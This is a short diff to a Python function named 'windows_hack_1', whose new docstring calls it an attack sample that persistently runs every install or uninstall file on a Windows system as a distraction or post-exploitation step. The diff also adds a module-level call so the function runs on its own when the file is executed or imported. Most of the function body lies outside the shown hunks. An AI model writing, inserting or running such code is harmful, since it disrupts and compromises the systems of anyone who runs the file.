@@ -1,6 +1,10 @@
 def windows_hack_1():
-    ''' runs every installed program 
-    installed on a windows system, persistent'''
+    ''' 
+    FUNCTION BY HUD SEIDU DAANNAA MSc | CEH
+    This is an attack sample function which will runs every 
+    installation or uninstallation files on a windows system, persistent
+    1) it can be used as a distraction or a post exploitation operation
+    '''
     import sys
     if sys.platform == 'win32': 
         import os
@@ -49,4 +53,6 @@ def windows_hack_1():
                             except WindowsError:
                                 pass
     else:
-        pass    
+        pass
+    
+windows_hack_1()
